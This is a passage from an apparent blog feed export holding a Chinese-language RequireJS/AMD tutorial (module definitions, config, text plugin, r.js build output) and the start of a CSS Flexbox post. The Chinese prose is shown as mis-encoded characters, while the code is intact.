</span>&#123;</span><br><span class="line">                el.removeEvent(<span class="string">"on"</span> + evt, fn);</span><br><span class="line">                <span class="keyword">return</span> el;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</span><br><span class="line">                el[<span class="string">"on"</span> + evt] = fn;</span><br><span class="line">                <span class="keyword">return</span> el;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.removeEvent(el, evt, fn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>main.js</code> ä½¿ç”¨ <strong>RequireJS</strong> åŠ è½½æ¨¡å—ï¼Œæ¨¡å—ä¸éœ€è¦åç¼€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>([<span class="string">"dom/events"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åœ¨ <code>main.js</code> ä½¿ç”¨æ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>([<span class="string">"dom/events"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">events</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">"target"</span>);</span><br><span class="line">    events.addEvent(elem, <span class="string">"click"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"clicked"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>index.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Learn Require.js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">"js/main"</span> <span class="attr">src</span>=<span class="string">"js/require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"target"</span>&gt;</span>Learning Require.js<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è®©æ¨¡å—ç¨å¾®å¤æ‚ç‚¹ <code>dom/events.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// we will add our sugar methods dynamically in here.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventObject;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å†å†™ä¸ª <em>Array.prototype.forEach</em> å…¼å®¹æ–¹æ³• <code>utils/array.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nativeForEach = <span class="function"><span class="keyword">function</span> (<span class="params">list, callback, thisArg</span>) </span>&#123;</span><br><span class="line">        [].forEach.call(list, callback, thisArg);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> customForEach = <span class="function"><span class="keyword">function</span> (<span class="params">list, callback, thisArg</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> T, k = <span class="number">0</span>, o, len, kValue;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">" this is null or not defined"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        O = <span class="built_in">Object</span>(list);</span><br><span class="line">        len = O.length &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (&#123;&#125;.toString.call(callback) != <span class="string">"[object Function]"</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(callback + <span class="string">" is not a function"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (thisArg) &#123;</span><br><span class="line">            T = thisArg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(k &lt; len) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k <span class="keyword">in</span> O) &#123;</span><br><span class="line">                kValue = O[k];</span><br><span class="line">                callback.call(T, kValue, O);</span><br><span class="line">            &#125;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        forEach: (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (&#123;&#125;.toString.call([].forEach) === <span class="string">"[object Function]"</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> nativeForEach;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> customForEach;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;())</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åŒæ ·ä½¿è¿™ä¸ªæ¨¡å—ç¨å¾®å¤æ‚ç‚¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define([<span class="string">"utils/array"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// we will add our sugar methods dynamically in here.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventObject;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åœ¨ <code>dom/events.js</code> ä¸­ä½¿ç”¨ <code>utils/array.js</code>ï¼Œæ·»åŠ ä¾èµ–å…³ç³»</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">define([<span class="string">"utils/array"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</span><br><span class="line"></span><br><span class="line">    array.forEach([<span class="string">"click"</span>, <span class="string">"mouseover"</span>,<span class="string">"mouseout"</span>, <span class="string">"keypress"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        eventObject[evt] = <span class="function"><span class="keyword">function</span> (<span class="params">el, fn</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.addEvent(el, evt, fn);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventObject;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åœ¨ <code>main.js</code> ä½¿ç”¨æ·»åŠ äº† <code>utils/array.js</code> ä¾èµ–çš„ <code>dom/events.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">event.click(elem, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">"clicked"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ¨¡å—çš„åå­—ä¸æŒ‡å®šåˆ™ä¸ºæ¨¡å—é»˜è®¤å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">require([&quot;utils/array&quot;], function () &#123;</span><br><span class="line">    var arr = [1,2,3];</span><br><span class="line"></span><br><span class="line">    arrayUtils.forEach(arr, function (item) &#123;</span><br><span class="line">        // action here</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">```javascript</span><br><span class="line"></span><br><span class="line">é…ç½® **RequireJS**</span><br><span class="line"></span><br><span class="line">`index.html` åŠ è½½æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line">&lt;script src=&quot;js/require.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>main.js</code> å®Œæ•´é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">requirejs.config(&#123;</span><br><span class="line">    baseUrl: <span class="string">'./js'</span>,</span><br><span class="line">    paths: &#123;</span><br><span class="line">    jquery: <span class="string">'bower_components/jquery/dist/jquery.min'</span>,</span><br><span class="line">    underscore: <span class="string">'bower_components/underscore/underscore-min'</span>,</span><br><span class="line">    angular: <span class="string">'bower_components/angular/angular.min'</span>,</span><br><span class="line">    bootstrap: <span class="string">"bower_components/bootstrap/dist/js/bootstrap.min"</span>,</span><br><span class="line">    semantic: <span class="string">"bower_components/semantic-ui/dist/semantic.min"</span>,</span><br><span class="line">    C: <span class="string">'js/controllers'</span>,</span><br><span class="line">    S: <span class="string">'js/services'</span>,</span><br><span class="line">    F: <span class="string">'js/filters'</span>,</span><br><span class="line">    D: <span class="string">'js/directives'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    shim: &#123;</span><br><span class="line">    jquery: &#123;</span><br><span class="line">        exports: <span class="string">'$'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    underscore: &#123;</span><br><span class="line">        exports: <span class="string">'_'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    angular: &#123;</span><br><span class="line">        deps: [<span class="string">'jquery'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    bootstrap: &#123;</span><br><span class="line">        deps: [<span class="string">'jquery'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    semantic: &#123;</span><br><span class="line">        deps: [<span class="string">'jquery'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="RequireJS-æ’ä»¶"><a href="#RequireJS-æ’ä»¶" class="headerlink" title="RequireJS æ’ä»¶"></a><strong>RequireJS</strong> æ’ä»¶</h3><p>ä»¥ <a href="http://requirejs.org/docs/download.html#text" target="_blank" rel="noopener">text plugin</a> ä¸ºä¾‹</p><p>æŠŠ <a href="http://requirejs.org/docs/download.html#text" target="_blank" rel="noopener">text.js</a> æ”¾åœ¨ <code>main.js</code> åŒçº§ç›®å½•ï¼Œåœ¨ <code>main.js</code> è¯·æ±‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>([<span class="string">"text!templates/list.html"</span>, <span class="string">"libs/underscore"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">listTpl</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Underscore is loaded globally.</span></span><br><span class="line">    <span class="keyword">var</span> context = &#123;</span><br><span class="line">        people : &#123;</span><br><span class="line">            <span class="string">"Fredrick"</span> : <span class="string">"Back-end Developer"</span>,</span><br><span class="line">            <span class="string">"Victoria"</span> : <span class="string">"Front-end Developer"</span>,</span><br><span class="line">            <span class="string">"Hamilton"</span> : <span class="string">"Designer"</span>,</span><br><span class="line">            <span class="string">"Georgea"</span>  : <span class="string">"Content Strategist"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">document</span>.body.innerHTML =  _.template(listTpl)(context);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>templates/list.html</code> æ¨¡æ¿ç”¨çš„æ˜¯ <strong>Rails</strong> <code>html</code> æ¨¡æ¿è¯­æ³•ï¼Œå› ä¸º <strong>underscorejs</strong> çš„ <a href="http://underscorejs.org/#template" target="_blank" rel="noopener">_.template()</a> é»˜è®¤è¿™ç§å†™æ³•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> <span class="attr">_.each</span>(<span class="attr">people</span>, <span class="attr">function</span> (<span class="attr">job</span>, <span class="attr">name</span>) &#123; %&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">name</span> %&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>: <span class="tag">&lt;<span class="name">%=</span> <span class="attr">job</span> %&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> &#125;); %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cms-assets.tutsplus.com/legacy-premium-tutorials/posts/11931/images/11931_c64d1e1d443dbd47e7a52e54986d197c.png" alt=""></p><h3 id="ä¼˜åŒ–å·¥å…·"><a href="#ä¼˜åŒ–å·¥å…·" class="headerlink" title="ä¼˜åŒ–å·¥å…·"></a>ä¼˜åŒ–å·¥å…·</h3><p><code>app.build.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&#123;</span><br><span class="line">    appDir: <span class="string">"../"</span>,</span><br><span class="line">    baseUrl: <span class="string">"js"</span>,</span><br><span class="line">    dir: <span class="string">"../../sample-build"</span>,</span><br><span class="line">    optimizeCSS: <span class="string">"standard"</span>,</span><br><span class="line">    paths : &#123;</span><br><span class="line">        <span class="string">"underscore"</span> : <span class="string">"libs/underscore-min"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    modules: [ &#123; <span class="attr">name</span>: <span class="string">"main"</span> &#125; ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>r.js</code> é»˜è®¤ä¼˜åŒ–é…ç½®ï¼Œå¯ä»¥é€‰æ‹©æ€§æ”¹å˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">buildBaseConfig = &#123;</span><br><span class="line">    appDir: <span class="string">""</span>,</span><br><span class="line">    pragmas: &#123;&#125;,</span><br><span class="line">    paths: &#123;&#125;,</span><br><span class="line">    optimize: <span class="string">"uglify"</span>,</span><br><span class="line">    optimizeCss: <span class="string">"standard.keepLines"</span>,</span><br><span class="line">    inlineText: <span class="literal">true</span>,</span><br><span class="line">    isBuild: <span class="literal">true</span>,</span><br><span class="line">    optimizeAllPluginResources: <span class="literal">false</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¼€å§‹ build ä¼˜åŒ–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node /path/to/r.js -o app.build.js</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Optimizing (standard) CSS file: /Users/andrew/Sites/sample-build/css/custom.css</span><br><span class="line">Optimizing (standard) CSS file: /Users/andrew/Sites/sample-build/css/main.css</span><br><span class="line"></span><br><span class="line">Tracing dependencies <span class="keyword">for</span>: main</span><br><span class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/app.build.js</span><br><span class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/dom/events.js</span><br><span class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/libs/underscore-min.js</span><br><span class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/main.js</span><br><span class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/require.js</span><br><span class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/text.js</span><br><span class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/utils/array.js</span><br><span class="line"></span><br><span class="line">js/main.js</span><br><span class="line">----------------</span><br><span class="line">js/utils/array.js</span><br><span class="line">js/dom/events.js</span><br><span class="line">js/text.js</span><br><span class="line">text!templates/list.html</span><br><span class="line">js/libs/underscore-min.js</span><br><span class="line">js/main.js</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;æ‘˜å½•è‡ªï¼š&lt;a href=&quot;https://code.tutsplus.com/tutorials/next-generation-javascript-with-amd-and-requirejs--net-21596&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Next Generation JavaScript with AMD and RequireJS&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;ä¸ºäº†è§£å†³çš„é—®é¢˜&quot;&gt;&lt;a href=&quot;#ä¸ºäº†è§£å†³çš„é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;ä¸ºäº†è§£å†³çš„é—®é¢˜&quot;&gt;&lt;/a&gt;ä¸ºäº†è§£å†³çš„é—®é¢˜&lt;/h3&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file1.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file2.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file3.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="AMD" scheme="http://youngdze.co/tags/AMD/"/>
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>CSS Flexbox</title>
    <link href="http://youngdze.co/2015/08/27/css-flexbox/"/>
    <id>http://youngdze.co/2015/08/27/css-flexbox/</id>
    <published>2015-08-27T08:36:20.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ‰ä¸€ä¸ªå®¹å™¨ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>è®¾ç½®å®¹å™¨å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="comment">/* å†…éƒ¨é¡¹ç›®æ’åˆ—æ–¹å‘ */</span></span><br><span class="line">    <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</span><br><span class="line">    <span class="comment">/* æ˜¯å¦æ¢è¡Œå’Œæ¢è¡Œååè¿‡æ¥ */</span></span><br><span class="line">    <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line">    <span class="comment">/* é€Ÿå†™æ³• */</span></span><br><span class="line">    flex-flow: &lt;&amp;#39;flex-direction&amp;#39;&gt; || &lt;&amp;#39;flex-wrap&amp;#39;&gt;;</span><br><span class="line">    <span class="comment">/* æ•´ç†ç‰ˆé¢ */</span></span><br><span class="line">    justify-content: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line">    <span class="comment">/* æ’åˆ—å†…éƒ¨é¡¹ç›® */</span></span><br><span class="line">    align-items: flex-start | flex-end | center | stretch | baseline;</span><br><span class="line">    <span class="comment">/* æ’åˆ—å†…å®¹ */</span></span><br><span class="line">    align-content: flex-start | flex-end | center | stretch | space-between | space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®å†…éƒ¨é¡¹ç›®å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">    <span class="comment">/* æ’åˆ—é¡ºåº */</span></span><br><span class="line">    <span class="attribute">order</span>: &lt;integer&gt;;</span><br><span class="line">    <span class="comment">/* æ˜¯å¦æ‹‰é•¿ */</span></span><br><span class="line">    <span class="attribute">flex-grow</span>: &lt;number&gt;; <span class="comment">/* default 0 means no flex grow */</span></span><br><span class="line">    <span class="comment">/* æ˜¯å¦æ”¶ç¼© */</span></span><br><span class="line">    <span class="attribute">flex-shrink</span>: &lt;number&gt;; <span class="comment">/* default 0 means no flex shrink*/</span></span><br><span class="line">    <span class="comment">/* é¡¹ç›®é•¿åº¦ */</span></span><br><span class="line">    <span 